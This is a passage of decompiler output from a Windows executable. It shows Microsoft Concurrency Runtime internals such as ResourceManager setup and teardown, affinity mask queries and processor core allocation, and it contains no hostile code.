  *(_DWORD *)(this + 68) = 0;
  *(_DWORD *)(this + 72) = 0;
  *(_DWORD *)(this + 76) = 0;
  *(_DWORD *)(this + 80) = 0;
  *(_DWORD *)(this + 84) = 0;
  *(_DWORD *)(this + 88) = 0;
  *(_DWORD *)(this + 92) = 0;
  v5 = 0;
  *(_DWORD *)(this + 96) = 0;
  *(_DWORD *)(this + 100) = 0;
  sub_4565F6((char *)(this + 104));
  LOBYTE(v5) = 1;
  sub_44D376(1);
  sub_44B96A((_DWORD *)this);
  if ( dword_500024 < 3 )
  {
    v2 = VirtualAlloc(0, 0x1000u, 0x3000u, 4u);
    *(_DWORD *)(this + 140) = v2;
    if ( !v2 )
    {
      sub_42E414(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    *v2 = 1;
  }
  else
  {
    *(_DWORD *)(this + 140) = 0;
  }
  *(_DWORD *)(this + 80) = sub_44A69C(0);
  *(_DWORD *)(this + 84) = unknown_libname_86((unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(this + 12));
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4939E8: using guessed type void *Concurrency::details::ResourceManager::`vftable';
// 500024: using guessed type int dword_500024;

//----- (0044AFEA) --------------------------------------------------------
void *__thiscall sub_44AFEA(_DWORD *this)
{
  void *result; // eax

  this[3] = 0;
  result = this;
  this[4] = 0;
  return result;
}

//----- (0044B006) --------------------------------------------------------
char *__thiscall sub_44B006(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::unsupported_os::`vftable';
  return this;
}
// 4939B8: using guessed type void *Concurrency::unsupported_os::`vftable';

//----- (0044B021) --------------------------------------------------------
void __thiscall sub_44B021(void **this)
{
  sub_44775B(this[9]);
}

//----- (0044B02E) --------------------------------------------------------
void __thiscall sub_44B02E(char *this)
{
  unsigned int v2; // edi
  int v3; // ebx
  Concurrency::details::GlobalCore *v4; // ecx
  Concurrency::details::GlobalCore *v5; // ecx
  void *v6; // eax

  v2 = 0;
  *(_DWORD *)this = &Concurrency::details::ResourceManager::`vftable';
  if ( *((_DWORD *)this + 6) )
  {
    v3 = 0;
    do
    {
      v4 = *(Concurrency::details::GlobalCore **)(*((_DWORD *)this + 18) + v3 + 32);
      if ( v4 )
        Concurrency::details::GlobalCore::`vector deleting destructor'(v4, 3u);
      ++v2;
      v3 += 40;
    }
    while ( v2 < *((_DWORD *)this + 6) );
  }
  v5 = (Concurrency::details::GlobalCore *)*((_DWORD *)this + 18);
  if ( v5 )
    Concurrency::details::GlobalCore::`vector deleting destructor'(v5, 3u);
  j_j__free(*((void **)this + 17));
  v6 = (void *)*((_DWORD *)this + 35);
  if ( v6 )
    VirtualFree(v6, 0, 0x8000u);
  CloseHandle(*((HANDLE *)this + 20));
  j_j__free(*((void **)this + 21));
  if ( *((_DWORD *)this + 19) )
  {
    sub_44A68E(*((HANDLE *)this + 19));
    j_j__free(*((void **)this + 22));
    j_j__free(*((void **)this + 23));
  }
  sub_456631((_DWORD *)this + 26);
  sub_449F62((LPCRITICAL_SECTION)(this + 44));
}
// 4939E8: using guessed type void *Concurrency::details::ResourceManager::`vftable';

//----- (0044B101) --------------------------------------------------------
void __thiscall sub_44B101(LPCRITICAL_SECTION *this)
{
  sub_44A32E(*this);
}

//----- (0044B137) --------------------------------------------------------
_DWORD *__thiscall sub_44B137(_DWORD *this)
{
  _DWORD *result; // eax

  result = (_DWORD *)*this;
  *(_DWORD *)*this = 0;
  return result;
}

//----- (0044B1CA) --------------------------------------------------------
void **__thiscall sub_44B1CA(void **Block, char a2)
{
  sub_44775B(Block[1]);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0044B1F3) --------------------------------------------------------
int __thiscall sub_44B1F3(_DWORD *this, int a2)
{
  int result; // eax

  result = this[1];
  if ( result )
  {
    *(_DWORD *)(a2 + 24) = *(_DWORD *)(result + 24);
    *(_DWORD *)(a2 + 28) = this[1];
    *(_DWORD *)(*(_DWORD *)(this[1] + 24) + 28) = a2;
    result = this[1];
    *(_DWORD *)(result + 24) = a2;
  }
  else
  {
    *(_DWORD *)(a2 + 24) = a2;
    *(_DWORD *)(a2 + 28) = a2;
  }
  ++*this;
  this[1] = a2;
  return result;
}

//----- (0044B22C) --------------------------------------------------------
unsigned int __thiscall sub_44B22C(int *this, unsigned int a2, unsigned int a3, unsigned int a4)
{
  unsigned int v4; // eax
  unsigned int v5; // esi
  unsigned int i; // esi
  int v7; // edx
  unsigned int v8; // esi
  _DWORD *v9; // edx

  v4 = a3;
  v5 = a2;
  if ( a2 >= a3 )
  {
    v8 = 0;
    if ( a4 )
    {
      do
      {
        v9 = *(_DWORD **)(this[23] + 4 * v8++);
        v9[1] = v9[9] - *(_DWORD *)(v9[4] + 160);
      }
      while ( v8 < a4 );
      return a3;
    }
    return v4;
  }
  else if ( a4 == 1 )
  {
    *(_DWORD *)(*(_DWORD *)this[23] + 4) = a2;
  }
  else
  {
    if ( a4 )
    {
      for ( i = 0; i < a4; ++i )
      {
        v7 = *(_DWORD *)(this[23] + 4 * i);
        *(double *)(v7 + 8) = (double)(unsigned int)(*(_DWORD *)(v7 + 36) - *(_DWORD *)(*(_DWORD *)(v7 + 16) + 160))
                            * ((double)a2
                             / (double)a3);
      }
      v5 = a2;
    }
    sub_44E764(this[23], a4);
  }
  return v5;
}

//----- (0044B2FC) --------------------------------------------------------
int __thiscall sub_44B2FC(_DWORD *this, int a2)
{
  int result; // eax

  result = sub_44CBF9(this, *(_WORD *)(a2 + 4));
  if ( result )
  {
    result = *(_DWORD *)result;
    *(_DWORD *)a2 &= result;
  }
  else
  {
    *(_DWORD *)a2 = 0;
  }
  return result;
}

//----- (0044B31F) --------------------------------------------------------
int __cdecl sub_44B31F(int *a1)
{
  int result; // eax
  int v2[3]; // [esp+8h] [ebp-Ch] BYREF

  memset(v2, 0, sizeof(v2));
  v2[0] = *a1;
  sub_44B34A(v2);
  result = v2[0];
  *a1 = v2[0];
  return result;
}

//----- (0044B34A) --------------------------------------------------------
int __cdecl sub_44B34A(_DWORD *a1)
{
  int result; // eax
  _DWORD *v2; // ecx

  result = (int)a1;
  if ( *a1 )
  {
    v2 = dword_500010;
    if ( dword_500010 )
      return sub_44B2FC(v2, (int)a1);
    v2 = (_DWORD *)dword_50000C;
    if ( dword_50000C )
      return sub_44B2FC(v2, (int)a1);
  }
  return result;
}
// 50000C: using guessed type int dword_50000C;

//----- (0044B371) --------------------------------------------------------
int __thiscall sub_44B371(DWORD_PTR *this, HANDLE hThread)
{
  return sub_44A9C7(hThread, this);
}

//----- (0044B383) --------------------------------------------------------
ULONG_PTR sub_44B383()
{
  HANDLE CurrentProcess; // eax
  ULONG_PTR result; // eax
  HANDLE CurrentThread; // eax
  ULONG_PTR *v3; // esi
  ULONG_PTR v4; // edx
  __int16 v5; // cx
  _DWORD *v6; // esi
  ULONG_PTR *v7; // eax
  ULONG_PTR *v8; // edx
  ULONG_PTR v9; // ecx
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-30h] BYREF
  void *Block; // [esp+20h] [ebp-20h]
  int v13; // [esp+24h] [ebp-1Ch] BYREF
  __int16 v14; // [esp+28h] [ebp-18h]
  int v15; // [esp+3Ch] [ebp-4h]

  CurrentProcess = GetCurrentProcess();
  if ( !GetProcessAffinityMask(CurrentProcess, &ProcessAffinityMask, &SystemAffinityMask) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  result = ProcessAffinityMask;
  if ( ProcessAffinityMask != SystemAffinityMask )
  {
    if ( dword_500024 < 4 )
    {
      result = (ULONG_PTR)operator new(8u);
      v6 = (_DWORD *)result;
      Block = (void *)result;
      v15 = 0;
      if ( result )
      {
        v7 = (ULONG_PTR *)operator new(0xCu);
        v8 = v7;
        Block = v7;
        if ( v7 )
        {
          v9 = ProcessAffinityMask;
          *v7 = 0;
          v7[1] = 0;
          v7[2] = 0;
          *((_WORD *)v7 + 2) = 0;
          *v7 = v9;
        }
        else
        {
          v8 = 0;
        }
        v6[1] = v8;
        result = 1;
        *(_WORD *)v6 = 1;
      }
      else
      {
        v6 = 0;
      }
      dword_500010 = v6;
    }
    else
    {
      CurrentThread = GetCurrentThread();
      sub_44AEE5(&v13, (int)CurrentThread);
      v3 = (ULONG_PTR *)operator new(0xCu);
      Block = v3;
      if ( v3 )
      {
        v4 = ProcessAffinityMask;
        v5 = v14;
        *v3 = 0;
        v3[1] = 0;
        v3[2] = 0;
        *((_WORD *)v3 + 2) = v5;
        *v3 = v4;
      }
      else
      {
        v3 = 0;
      }
      result = (ULONG_PTR)operator new(8u);
      Block = (void *)result;
      if ( result )
      {
        *(_DWORD *)(result + 4) = v3;
        *(_WORD *)result = 1;
      }
      else
      {
        result = 0;
      }
      dword_500010 = (void *)result;
    }
  }
  return result;
}
// 500024: using guessed type int dword_500024;
// 44B383: using guessed type _DWORD pExceptionObject[4];

//----- (0044B4A8) --------------------------------------------------------
void sub_44B4A8()
{
  free(Block);
  Block = 0;
  ReturnedLength = 0;
}

//----- (0044B4C3) --------------------------------------------------------
_DWORD *__thiscall sub_44B4C3(_DWORD *this, int a2)
{
  unsigned int v3; // ecx
  _DWORD *result; // eax
  unsigned int *v5; // esi
  unsigned int v6; // edi
  int v7; // ecx
  int v8; // edx
  _DWORD *v9; // eax
  int v10; // ecx
  int v11; // edx
  bool v12; // zf
  int v13; // eax
  int v14; // [esp+4h] [ebp-1Ch]
  unsigned int v15; // [esp+8h] [ebp-18h]
  int v16; // [esp+Ch] [ebp-14h]
  _DWORD *v17; // [esp+10h] [ebp-10h]
  int v18; // [esp+14h] [ebp-Ch]
  int v19; // [esp+1Ch] [ebp-4h]

  v3 = 0;
  v15 = 0;
  result = *(_DWORD **)(a2 + 16);
  if ( this[6] )
  {
    v5 = result + 1;
    v14 = -4 - (_DWORD)result;
    do
    {
      v6 = 0;
      if ( *v5 )
      {
        v7 = 0;
        v19 = 0;
        do
        {
          v16 = 0;
          v8 = 1;
          result = (_DWORD *)(v7 + v5[11]);
          v18 = 1;
          v17 = result;
          if ( this[2] > 1u )
          {
            do
            {
              v9 = *(_DWORD **)(*(_DWORD *)(this[21] + 4 * v8) + 16);
              if ( v9[27] )
              {
                v10 = (int)v5 + v14 + v9[4];
                v11 = v19 + *(_DWORD *)(v10 + 48);
                if ( *(_DWORD *)v11 == 5 )
                {
                  if ( *v17 != 4 )
                  {
                    ++**(_DWORD **)(v11 + 20);
                    v13 = *(_DWORD *)(v10 + 48);
                    v7 = v19;
                    *(_DWORD *)(v19 + v13) = 4;
                    goto LABEL_16;
                  }
                  if ( v17[6] || *(_BYTE *)(v11 + 48) || v16 )
                  {
                    sub_4561E2(v9, v10, v6);
                  }
                  else
                  {
                    ++**(_DWORD **)(v11 + 20);
                    v12 = *(_BYTE *)(v11 + 49) == 0;
                    *(_DWORD *)v11 = 4;
                    if ( v12 )
                      sub_4563E9(v9, v10, v6);
                    v16 = 1;
                  }
                }
                v7 = v19;
              }
LABEL_16:
              result = (_DWORD *)(v18 + 1);
              v8 = (int)result;
              ++v18;
            }
            while ( (unsigned int)result < this[2] );
          }
          ++v6;
          v7 += 52;
          v19 = v7;
        }
        while ( v6 < *v5 );
        v3 = v15;
      }
      ++v3;
      v5 += 13;
      v15 = v3;
    }
    while ( v3 < this[6] );
  }
  return result;
}

//----- (0044B5D0) --------------------------------------------------------
unsigned int __thiscall sub_44B5D0(_DWORD *this)
{
  unsigned int v2; // esi

  v2 = this[47];
  if ( v2 >= sub_44B917(this) + 1 )
    return sub_44B917(this) + 1;
  return v2;
}

//----- (0044B5F3) --------------------------------------------------------
unsigned int __thiscall sub_44B5F3(_DWORD *this)
{
  int v2; // edi
  unsigned int v3; // eax
  unsigned int v4; // edx

  v2 = this[46];
  v3 = sub_44D60B(this);
  v4 = this[47];
  if ( v4 >= v2 + v3 + 1 )
    return sub_44D60B(this) + v2 + 1;
  return v4;
}

//----- (0044B620) --------------------------------------------------------
unsigned int *__thiscall sub_44B620(unsigned int *this)
{
  unsigned int *v1; // esi
  unsigned int *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // ebx
  unsigned int v5; // edi
  void *v6; // esi
  size_t v7; // eax
  int v8; // edx
  int v9; // edi
  _DWORD *v10; // esi
  _DWORD *v11; // edi
  int v12; // ecx
  unsigned int *v14; // [esp+18h] [ebp-28h]
  _DWORD *v16; // [esp+20h] [ebp-20h]
  int v17; // [esp+24h] [ebp-1Ch]
  unsigned int v18; // [esp+28h] [ebp-18h]
  int v19; // [esp+2Ch] [ebp-14h]
  unsigned int v20; // [esp+30h] [ebp-10h]

  v1 = this;
  v2 = (unsigned int *)unknown_libname_86((52 * (unsigned __int64)this[6]) >> 32 != 0 ? -1 : 52 * this[6]);
  v14 = v2;
  memset(v2, 0, 52 * v1[6]);
  v18 = 0;
  if ( v1[6] )
  {
    v3 = 0;
    v4 = v2 + 1;
    v17 = 0;
    do
    {
      v16 = (_DWORD *)(v3 + v1[18]);
      qmemcpy(v4 - 1, v16, 0x18u);
      v5 = *v4;
      v6 = (void *)unknown_libname_86((52 * (unsigned __int64)*v4) >> 32 != 0 ? -1 : 52 * *v4);
      if ( v6 )
        `vector constructor iterator'(v6, 0x34u, v5, (void *(__thiscall *)(void *))sub_44AFEA);
      else
        v6 = 0;
      v7 = 52 * *v4;
      v4[11] = (unsigned int)v6;
      memset(v6, 0, v7);
      v20 = 0;
      if ( *v4 )
      {
        v8 = 0;
        v9 = 0;
        v19 = 0;
        do
        {
          v10 = (_DWORD *)(v9 + v16[8]);
          v11 = (_DWORD *)(v8 + v4[11]);
          *v11 = *v10++;
          *++v11 = *v10;
          v11[1] = v10[1];
          *(_DWORD *)(v8 + v4[11]) = 1;
          v12 = v19 + v16[8] + 16;
          v9 = v19 + 36;
          v19 += 36;
          *(_DWORD *)(v8 + v4[11] + 20) = v12;
          v8 += 52;
          ++v20;
        }
        while ( v20 < *v4 );
      }
      v4 += 13;
      v1 = this;
      v3 = v17 + 40;
      ++v18;
      v17 += 40;
    }
    while ( v18 < this[6] );
    return v14;
  }
  return v2;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0044B757) --------------------------------------------------------
BOOL __thiscall sub_44B757(LPVOID lpParameter)
{
  void *v2; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  v2 = (void *)sub_44AC35(0, 0x10000u, (LPTHREAD_START_ROUTINE)StartAddress, lpParameter, 0, 0);
  *((_DWORD *)lpParameter + 19) = v2;
  if ( !v2 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return sub_44AA0B(v2, 15);
}
// 44B757: using guessed type _DWORD pExceptionObject[4];

//----- (0044B7BE) --------------------------------------------------------
char *__thiscall sub_44B7BE(void *this, int a2)
{
  char *v3; // esi
  char *v4; // eax
  void *v6[3]; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a2 + 8))(a2, v6);
  v3 = 0;
  v7 = 0;
  v4 = (char *)operator new(0xD0u);
  LOBYTE(v7) = 1;
  if ( v4 )
    v3 = sub_4552B4(v4, a2, (int)this, v6);
  sub_454793(v6);
  return v3;
}

//----- (0044B820) --------------------------------------------------------
volatile signed __int32 *sub_44B820()
{
  volatile signed __int32 *v0; // esi
  void *v1; // eax

  sub_44AE22(&dword_500068);
  if ( !dword_500000 || (v0 = (volatile signed __int32 *)sub_44AB76(dword_500000), !sub_44E91C(v0)) )
  {
    v1 = operator new(0x90u);
    if ( v1 )
      v0 = (volatile signed __int32 *)sub_44AF06((int)v1);
    else
      v0 = 0;
    _InterlockedIncrement(v0 + 1);
    dword_500000 = sub_44AB76((int)v0);
  }
  dword_500068 = 0;
  return v0;
}
// 500000: using guessed type int dword_500000;
// 500068: using guessed type int dword_500068;

//----- (0044B8B3) --------------------------------------------------------
int __thiscall sub_44B8B3(int this, int a2, int a3)
{
  int v4; // edi
  int v5; // ecx
  int i; // ecx

  v4 = 0;
  sub_44A1E8((LPCRITICAL_SECTION)(this + 44));
  v5 = *(_DWORD *)(this + 100);
  if ( v5 )
  {
    for ( i = *(_DWORD *)(v5 + 24); i; i = *(_DWORD *)(i + 24) )
    {
      v4 += *(_DWORD *)(52 * a3 + *(_DWORD *)(52 * a2 + *(_DWORD *)(i + 16) + 48) + 24);
      if ( i == *(_DWORD *)(this + 100) )
        break;
    }
  }
  sub_44A32E((LPCRITICAL_SECTION)(this + 44));
  return v4;
}

//----- (0044B917) --------------------------------------------------------
unsigned int __thiscall sub_44B917(_DWORD *this)
{
  unsigned int result; // eax

  result = this[47];
  if ( result >= this[32] + this[46] )
    return this[32] + this[46];
  return result;
}

//----- (0044B930) --------------------------------------------------------
void __thiscall sub_44B930(_DWORD *this, void **Block)
{
  void **v2; // ebx
  unsigned int v3; // esi
  void **v4; // edi

  v2 = Block;
  v3 = 0;
  if ( this[6] )
  {
    v4 = Block + 12;
    do
    {
      j_j__free(*v4);
      ++v3;
      v4 += 13;
    }
    while ( v3 < this[6] );
    v2 = Block;
  }
  j_j__free(v2);
}

//----- (0044B96A) --------------------------------------------------------
void __thiscall sub_44B96A(_DWORD *this)
{
  unsigned int v1; // edi
  void *v2; // eax
  size_t v3; // ecx
  unsigned int v4; // esi
  int v5; // ecx
  unsigned int *v6; // eax
  void *v7; // ecx
  size_t v8; // eax
  unsigned __int16 *v9; // ebx
  DWORD v10; // ecx
  int v11; // edx
  int v12; // ecx
  char *v13; // esi
  int v14; // eax
  int v15; // esi
  int v16; // esi
  _DWORD *v17; // edx
  int v18; // ecx
  unsigned int *v19; // esi
  unsigned int v20; // esi
  DWORD v21; // ecx
  unsigned __int16 v22; // dx
  int v23; // ebx
  unsigned int *v24; // ecx
  unsigned int v25; // eax
  unsigned int v26; // esi
  int v27; // ecx
  unsigned int v28; // edx
  _DWORD *v29; // ebx
  int v30; // eax
  int v32; // [esp+10h] [ebp-14h]
  unsigned int v33; // [esp+10h] [ebp-14h]
  int v34; // [esp+10h] [ebp-14h]
  int v35; // [esp+14h] [ebp-10h]
  int v36; // [esp+14h] [ebp-10h]
  int v37; // [esp+18h] [ebp-Ch]
  DWORD v38; // [esp+1Ch] [ebp-8h]
  int v39; // [esp+1Ch] [ebp-8h]
  int v40; // [esp+20h] [ebp-4h]
  DWORD v41; // [esp+20h] [ebp-4h]

  v1 = (unsigned int)this;
  this[5] = dword_500020;
  this[6] = dword_50001C;
  this[7] = dword_500014;
  v2 = (void *)unknown_libname_86((12 * (unsigned __int64)(unsigned int)this[5]) >> 32 != 0 ? -1 : 12 * this[5]);
  v3 = 12 * *(_DWORD *)(v1 + 20);
  *(_DWORD *)(v1 + 68) = v2;
  memset(v2, 0, v3);
  v4 = *(_DWORD *)(v1 + 24);
  v5 = (40 * (unsigned __int64)v4) >> 32 != 0 ? -1 : 40 * v4;
  v6 = (unsigned int *)unknown_libname_86(__CFADD__(v5, 4) ? -1 : v5 + 4);
  if ( v6 )
  {
    *v6 = v4;
    v7 = v6 + 1;
  }
  else
  {
    v7 = 0;
  }
  v8 = 40 * *(_DWORD *)(v1 + 24);
  *(_DWORD *)(v1 + 72) = v7;
  memset(v7, 0, v8);
  if ( dword_500024 >= 4 )
  {
    v9 = (unsigned __int16 *)Block;
    v10 = 0;
    v11 = 0;
    v38 = 0;
    v40 = 0;
    if ( ReturnedLength )
    {
      v35 = 0;
      while ( 1 )
      {
        if ( *(_DWORD *)v9 == 1 )
        {
          if ( !byte_500018 && *((_DWORD *)v9 + 8) )
          {
            v15 = 40 * v11;
            sub_44D1A1((unsigned int *)(40 * v11 + *(_DWORD *)(v1 + 72)), v1, v11, v9[18], *((_DWORD *)v9 + 8), 0, 0);
            ++v40;
            *(_DWORD *)(v15 + *(_DWORD *)(v1 + 72) + 20) = *((_DWORD *)v9 + 2);
            v10 = v38;
          }
          v16 = *((_DWORD *)v9 + 8);
          if ( !v16 )
            goto LABEL_21;
          v17 = (_DWORD *)(v35 + *(_DWORD *)(v1 + 68));
          v18 = v9[18];
          v35 += 12;
          v17[2] = *((_DWORD *)v9 + 2);
          v17[1] = v18;
          *v17 = v16;
        }
        else
        {
          if ( *(_DWORD *)v9 != 3 || !byte_500018 )
            goto LABEL_21;
          v12 = 0;
          v13 = (char *)(v9 + 16);
          v14 = 40 * v11;
          v32 = 0;
          v37 = 40 * v11;
          do
          {
            if ( *(_DWORD *)v13 )
            {
              sub_44D1A1(
                (unsigned int *)(v14 + *(_DWORD *)(v1 + 72)),
                v1,
                v11,
                *((_WORD *)v13 + 2),
                *(_DWORD *)v13,
                0,
                0);
              v12 = v32;
              LOWORD(v11) = v40 + 1;
              v37 += 40;
              ++v40;
            }
            ++v12;
            v13 += 12;
            v32 = v12;
            v14 = v37;
          }
          while ( v12 < v9[15] );
        }
        v10 = v38;
LABEL_21:
        v10 += *((_DWORD *)v9 + 1);
        v9 = (unsigned __int16 *)((char *)v9 + *((_DWORD *)v9 + 1));
        v11 = v40;
        v38 = v10;
        if ( v10 >= ReturnedLength )
          goto LABEL_42;
      }
    }
    goto LABEL_42;
  }
  v19 = (unsigned int *)Block;
  if ( !Block )
  {
    if ( dword_50000C )
      v20 = *(_DWORD *)sub_44CBF9((_DWORD *)dword_50000C, (__int16)Block);
    else
      v20 = ProcessAffinityMask;
    sub_44D1A1(*(unsigned int **)(v1 + 72), v1, 0, 0, v20, 0, 0);
    **(_DWORD **)(v1 + 68) = v20;
    goto LABEL_43;
  }
  v21 = 0;
  v22 = 0;
  v41 = 0;
  v39 = 0;
  if ( ReturnedLength )
  {
    v36 = 0;
    v23 = 0;
    do
    {
      if ( v19[1] != 1 )
      {
        if ( v19[1] != 3 || !byte_500018 || !*v19 )
          goto LABEL_41;
        sub_44D1A1((unsigned int *)(v23 + *(_DWORD *)(v1 + 72)), v1, v22, 0, *v19, 0, 0);
        v22 = v39 + 1;
        v23 += 40;
        ++v39;
        goto LABEL_40;
      }
      if ( !byte_500018 )
      {
        if ( !*v19 )
          goto LABEL_41;
        sub_44D1A1((unsigned int *)(v23 + *(_DWORD *)(v1 + 72)), v1, v22, 0, *v19, 0, 0);
        v22 = ++v39;
        *(_DWORD *)(v23 + *(_DWORD *)(v1 + 72) + 20) = v19[2];
        v23 += 40;
        v21 = v41;
      }
      v33 = *v19;
      if ( *v19 )
      {
        v24 = (unsigned int *)(v36 + *(_DWORD *)(v1 + 68));
        v25 = v19[2];
        v24[1] = 0;
        v36 += 12;
        v24[2] = v25;
        *v24 = v33;
LABEL_40:
        v21 = v41;
      }
LABEL_41:
      v21 += 24;
      v19 += 6;
      v41 = v21;
    }
    while ( v21 < ReturnedLength );
  }
LABEL_42:
  sub_44B4A8();
LABEL_43:
  if ( !byte_500018 )
    return;
  v26 = 0;
  if ( !*(_DWORD *)(v1 + 24) )
    return;
  v27 = 0;
  do
  {
    v28 = 0;
    if ( !*(_DWORD *)(v1 + 20) )
      goto LABEL_54;
    v29 = *(_DWORD **)(v1 + 68);
    v34 = *(_DWORD *)(v1 + 72);
    v30 = *(_DWORD *)(v27 + v34 + 12);
    while ( v30 != v29[1] )
    {
LABEL_51:
      ++v28;
      v29 += 3;
      if ( v28 >= *(_DWORD *)(v1 + 20) )
        goto LABEL_54;
    }
    v1 = (unsigned int)this;
    if ( (*v29 & *(_DWORD *)(v27 + v34)) == 0 )
    {
      v30 = *(_DWORD *)(v27 + v34 + 12);
      goto LABEL_51;
    }
    *(_DWORD *)(v27 + v34 + 20) = *(_DWORD *)(12 * v28 + this[17] + 8);
LABEL_54:
    ++v26;
    v27 += 40;
  }
  while ( v26 < *(_DWORD *)(v1 + 24) );
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 50000C: using guessed type int dword_50000C;
// 500014: using guessed type int dword_500014;
// 500018: using guessed type char byte_500018;
// 50001C: using guessed type int dword_50001C;
// 500020: using guessed type int dword_500020;
// 500024: using guessed type int dword_500024;

//----- (0044BC85) --------------------------------------------------------
_DWORD *__thiscall sub_44BC85(_DWORD *this)
{
  _DWORD *result; // eax
  int v2; // ebx
  _DWORD *v3; // ebx
  int v4; // eax
  int v5; // edi
  int v7; // [esp+8h] [ebp-Ch] BYREF
  int v8; // [esp+Ch] [ebp-8h] BYREF
  int v9; // [esp+10h] [ebp-4h] BYREF

  result = this;
  v2 = this[25];
  if ( v2 )
  {
    v3 = *(_DWORD **)(v2 + 24);
    if ( v3 )
    {
      do
      {
        v4 = v3[30];
        v5 = v3[2];
        v7 = 0;
        v8 = 0;
        v9 = v4;
        (*(void (__thiscall **)(int, int *, int *, int *))(*(_DWORD *)v5 + 4))(v5, &v7, &v8, &v9);
        v3[30] = v9;
        result = this;
        if ( v3 == (_DWORD *)this[25] )
          break;
        result = (_DWORD *)v3[6];
        v3 = result;
      }
      while ( result );
    }
  }
  return result;
}

//----- (0044BCEA) --------------------------------------------------------
bool __thiscall sub_44BCEA(_DWORD *this)
{
  _DWORD *v1; // ebx
  int v2; // esi
  _DWORD *v3; // esi
  unsigned int v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // edi
  bool v7; // dl
  unsigned int v8; // ecx
  unsigned int v9; // edx
  unsigned int v10; // ebx
  int v11; // ecx
  bool v12; // zf
  int v13; // edi
  unsigned int v14; // ebx
  int v15; // ecx
  int v16; // eax
  int v18; // [esp+4h] [ebp-28h]
  _DWORD *v20; // [esp+10h] [ebp-1Ch]
  unsigned int v21; // [esp+14h] [ebp-18h]
  int v22; // [esp+18h] [ebp-14h]
  unsigned int v23; // [esp+1Ch] [ebp-10h]
  int v24; // [esp+1Ch] [ebp-10h]
  unsigned int v25; // [esp+20h] [ebp-Ch]
  int v26; // [esp+24h] [ebp-8h]
  bool v27; // [esp+2Bh] [ebp-1h]

  v1 = this;
  if ( !this[25] )
    return 1;
  v2 = this[25];
  if ( v2 )
    v3 = *(_DWORD **)(v2 + 24);
  else
    v3 = 0;
  v20 = v3;
  if ( v3[40] < sub_44B917(v3) || v3[42] )
  {
    v4 = sub_44B917(v3);
    v25 = sub_455776(v3, v4) - v3[40];
    v22 = v3[4];
    v26 = v3[5];
    v5 = sub_44B917(v3);
    v6 = v1[6];
    v7 = v5 != v1[7];
    v8 = 0;
    v21 = 0;
    if ( v6 )
    {
      while ( 1 )
      {
        v27 = v25 != 0 && v7;
        if ( v27 )
        {
          v9 = v8 + 1;
          v18 = *(_DWORD *)(v26 + 4 * v8);
          if ( v8 + 1 < v6 )
          {
            v10 = v8;
            v11 = v22 + 52 * v18;
            do
            {
              if ( *(_DWORD *)(v22 + 52 * *(_DWORD *)(v26 + 4 * v9) + 28) > *(_DWORD *)(v11 + 28) )
              {
                v11 = v22 + 52 * *(_DWORD *)(v26 + 4 * v9);
                v10 = v9;
              }
              ++v9;
            }
            while ( v9 < v6 );
            v8 = v21;
            v12 = v21 == v10;
            v3 = v20;
            v23 = v10;
            v1 = this;
            if ( !v12 )
            {
              *(_DWORD *)(v26 + 4 * v21) = *(_DWORD *)(v26 + 4 * v23);
              *(_DWORD *)(v26 + 4 * v23) = v18;
            }
          }
        }
        v13 = v22 + 52 * *(_DWORD *)(v26 + 4 * v8);
        if ( *(_DWORD *)(v13 + 4) )
          break;
LABEL_26:
        v6 = v1[6];
        ++v8;
        v7 = v27;
        v21 = v8;
        if ( v8 >= v6 )
          goto LABEL_27;
      }
      v14 = 0;
      v15 = 0;
      v24 = 0;
      while ( 1 )
      {
        v16 = *(_DWORD *)(v13 + 48);
        if ( *(_DWORD *)(v16 + v15) == 1 )
        {
          if ( v25 )
          {
            ++**(_DWORD **)(v16 + v15 + 20);
            sub_455567(v3, v13, v14, 0);
            --v25;
LABEL_23:
            v15 = v24;
          }
        }
        else if ( *(_BYTE *)(v16 + v15 + 49) )
        {
          sub_4563E9(v3, v13, v14);
          goto LABEL_23;
        }
        ++v14;
        v15 += 52;
        v24 = v15;
        if ( v14 >= *(_DWORD *)(v13 + 4) )
        {
          v1 = this;
          v8 = v21;
          goto LABEL_26;
        }
      }
    }
  }
LABEL_27:
  if ( v3[33] == v3[32] )
    sub_44E93B(v1, 0);
  return v3[40] == sub_44B917(v3);
}

//----- (0044BE8A) --------------------------------------------------------
void __thiscall sub_44BE8A(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5, unsigned int a6)
{
  unsigned int v6; // esi
  _DWORD *v7; // ebx
  unsigned int v8; // edi
  _DWORD *v9; // ecx
  int v10; // ecx
  unsigned int v11; // edi
  unsigned int v12; // ecx
  unsigned int v13; // edx
  int v14; // edi
  unsigned int v15; // eax
  int v16; // ecx
  int v17; // edx
  unsigned int v18; // eax
  unsigned int v19; // edi
  int v20; // eax
  int v22; // [esp+Ch] [ebp-18h]
  unsigned int v23; // [esp+10h] [ebp-14h]
  unsigned int v24; // [esp+10h] [ebp-14h]
  int v25; // [esp+14h] [ebp-10h]
  unsigned int v26; // [esp+18h] [ebp-Ch]
  unsigned int v27; // [esp+1Ch] [ebp-8h]
  char v28; // [esp+23h] [ebp-1h]

  v6 = a5;
  v7 = this;
  do
  {
    v8 = 0;
